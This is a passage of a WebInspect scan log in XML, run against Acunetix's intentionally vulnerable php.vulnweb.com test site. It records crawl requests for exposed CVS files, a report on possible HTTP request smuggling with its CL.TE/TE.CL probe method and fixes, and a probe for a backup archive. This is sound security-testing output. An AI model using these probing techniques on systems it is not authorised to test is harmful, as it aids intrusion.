Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:36 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-1"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>1</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="2BE1A9D69E668E693F6554B0899EC7A3"><URL>http://php.vulnweb.com:80/CVS/Repository</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="2BE1A9D69E668E693F6554B0899EC7A3"><![CDATA[GET /CVS/Repository HTTP/1.1
Referer: http://php.vulnweb.com/CVS/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="2BE1A9D69E668E693F6554B0899EC7A3";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ef5f4f5f";
X-Request-Memo: ID="89862983";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:36 GMT
ETag: "4dca64a4-8"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 8

acupart
]]></RawResponse><Request id="2BE1A9D69E668E693F6554B0899EC7A3"><Method>GET</Method><Path>/CVS/</Path><File>Repository</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/CVS/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="2BE1A9D69E668E693F6554B0899EC7A3";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ef5f4f5f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="89862983";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[acupart
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:36 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-8"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>8</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="D5876D8371AC57918EB60F90F76742A1"><URL>http://php.vulnweb.com:80/CVS/Root</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="D5876D8371AC57918EB60F90F76742A1"><![CDATA[GET /CVS/Root HTTP/1.1
Referer: http://php.vulnweb.com/CVS/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="D5876D8371AC57918EB60F90F76742A1";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="045ecbf5";
X-Request-Memo: ID="a0c79b26";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:36 GMT
ETag: "4dca64a4-1"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 1

 ]]></RawResponse><Request id="D5876D8371AC57918EB60F90F76742A1"><Method>GET</Method><Path>/CVS/</Path><File>Root</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/CVS/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="D5876D8371AC57918EB60F90F76742A1";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="045ecbf5";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a0c79b26";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[ ]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:36 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-1"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>1</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="2F96C104EE66BEC50B344FE19FA5C48E"><URL>http://php.vulnweb.com:80/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="bd4401bb-f9e2-4f0c-813a-034af5ea9f99"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11613</EngineType><AttackHTTPRequest><![CDATA[GET / HTTP/1.1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Referer: http://php.vulnweb.com/
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2F96C104EE66BEC50B344FE19FA5C48E";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Other";OriginatingEngineID="448ed5f3-d41b-4893-ae3d-7ec4afd3ed22";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11613";Engine="Http+Request+Smuggling";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="6b67a66b";
X-Request-Memo: ID="c8909826";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11622</VulnerabilityID><Severity>2</Severity><Name>HTTP Request Smuggling</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="CWE" identifier="CWE-444" href="http://cwe.mitre.org/data/definitions/444.html">CWE-444: Inconsistent Interpretation of HTTP Requests</Classification><Classification kind="7PK Category" identifier="Insecure Deployment: HTTP Request Smuggling" href="https://vulncat.fortify.com/">Insecure Deployment: HTTP Request Smuggling</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />
WebInspect has detected the application to be vulnerable to an HTTP Request Smuggling attack.  <br /><br />
HTTP Request Smuggling vulnerabilities arise due to the discrepancy in parsing of non-compliant HTTP headers by the front-end and back-end servers. By supplying a request that is interpreted as being of different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request or smuggle additional requests to the back-end server without the front-end server being aware of it. <br /><br />
There are numerous ways in which a malicious user can accomplish an HTTP Request Smuggling attack. In this instance, an incoming HTTP request that contains both Content-Length and Transfer-Encoding headers is interpreted differently by the front-end server and the back-end server. One honors the Content-Length header and the other the Transfer-Encoding header to determine the length of the request. This can render the application vulnerable to smuggling attacks.<br /><br /><drc_attacksequence /><br /><br />
The mean response time for the reported HTTP request/response is <drc_meanresponsedelay /> seconds. <br /> 
The attack timed out after <drc_smugglingattackdelay /> seconds.<br /><br />

WebInspect was unable to verify the vulnerability in this instance.  However, we recommend that you inspect your network and configuration settings of all chained elements in the network to ensure that the application is not vulnerable to the HTTP Request Smuggling vulnerability.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[Malicious users can use the HTTP Request Smuggling vulnerability to bypass front-end security rules, access internal systems, and poison web caches.  In addition, it can also be exploited to steal user information and launch cross-site scripting attacks.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[The Request Smuggling  check accuracy might be impacted if the server is processing multiple requests, or if there are multiple servers behind a load balancer. The load balancer might send attack and verification requests to different backend servers and that would fail to flag the issue correctly.  We recommend that you re-scan with a policy that contains only this check. Enable the traffic monitor.  <br />
Inspect the traffic monitor logs for the resulting scan if the vulnerability was flagged. Enable the column Scan.CheckID in the column view and filter on check ID 11613 to only see the traffic generated for this check. <br /><br />

Initial probe:  Check to see if the server might be vulnerable <br />
Locate a POST request with both Content-Type and Transfer-Encoding headers. The values of these two headers is crafted in such a way that can cause the server to timeout. Timeout indicates that the server might be vulnerable. <br /><br />
Verification step: <br /> 
The check verifies the vulnerability by sending two requests on same TCP/IP connection with server. The request is crafted so that an “SPI” string at the end of first of the two requests is put in a queue by the server and is prepended to next incoming request. The start of the next normal HTTP request is HTTP Method (GET/POST etc.), which due to the vulnerability becomes “SPIPOST.”  “SPIPOST” is a random HTTP method that is not expected to be implemented on the server. The server is expected to respond with a 501 Not implemented response code for this request if the vulnerability is confirmed and the response should be visible in the traffic log. If the vulnerability was not confirmed with SPI in the response string or the HTTP response code was not 501, this medium severity vulnerability is flagged. In this case, you should manually confirm the vulnerability by sending two back-to-back malformed requests with CL.TE or TE.CL payloads to the server on the same TCP/IP connection. 
<br />]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Fix this vulnerability by implementing one of the following:<br /><ol><li>Configure the front-end server to exclusively use HTTP/2 to communicate to back-end systems.</li><li>Disable back-end connection reuse. </li><li>Ensure all servers in the chain run the same webserver software with the same configuration. </li><li>Configure the back-end server to reject ambiguous HTTP requests, such as those that contain both Content-Length and Transfer-Encoding headers, and close the TCP/TLS connection.</li></ol>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><a href="https://cwe.mitre.org/data/definitions/444.html">CWE 444 - HTTP Request Smuggling</a><br /><br /><a href="https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)">OWASP - HTTP Request Smuggling<a /></a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="2F96C104EE66BEC50B344FE19FA5C48E"><![CDATA[GET / HTTP/1.1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Referer: http://php.vulnweb.com/
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2F96C104EE66BEC50B344FE19FA5C48E";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Other";OriginatingEngineID="448ed5f3-d41b-4893-ae3d-7ec4afd3ed22";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11613";Engine="Http+Request+Smuggling";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="6b67a66b";
X-Request-Memo: ID="c8909826";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:26 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4958

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="2F96C104EE66BEC50B344FE19FA5C48E"><Method>GET</Method><Path>/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="2F96C104EE66BEC50B344FE19FA5C48E";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Other";OriginatingEngineID="448ed5f3-d41b-4893-ae3d-7ec4afd3ed22";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11613";Engine="Http+Request+Smuggling";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="6b67a66b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c8909826";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:26 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4958</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="AE5C6BFA106D61173E9FA0632997C3D8"><URL>http://php.vulnweb.com:80/index.zip</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="1c7130c0-fa97-4bfc-829f-1af546c866c4"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11561</EngineType><AttackHTTPRequest><![CDATA[GET /index.zip HTTP/1.1
Referer: http://php.vulnweb.com/index.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="AE5C6BFA106D61173E9FA0632997C3D8";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="9d2b8591-9dbe-4085-bc79-15aeab89cc57";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11444";Engine="File+Extension+Replacement";SmartMode="4";tid="46";tt="40";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="4b54fc38";
X-Request-Memo: ID="5d8a0e38";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0

